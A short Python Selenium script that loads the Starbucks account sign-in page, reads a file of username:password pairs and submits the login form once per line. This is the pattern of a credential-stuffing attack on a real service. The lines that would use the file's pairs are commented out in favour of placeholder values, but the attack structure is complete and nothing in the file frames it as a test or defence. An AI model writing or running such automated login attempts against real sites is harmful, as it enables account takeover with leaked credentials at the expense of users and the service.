from selenium import webdriver

browser = webdriver.Chrome()

url = 'https://www.starbucks.com/account/signin'
browser.get(url)

username = "username"
password = "password"

with open('filename', 'r') as f:
	for line in f.readlines():
		creds = line.split(':')
		browser.find_element_by_id("username").clear()
		#browser.find_element_by_id("username").send_keys(creds[0])
		browser.find_element_by_id("username").send_keys(username)
		browser.find_element_by_id("password").clear()
		#browser.find_element_by_id("password").send_keys(creds[1])
		browser.find_element_by_id("password").send_keys(password)
		browser.find_element_by_xpath("//button[@type='submit']").click()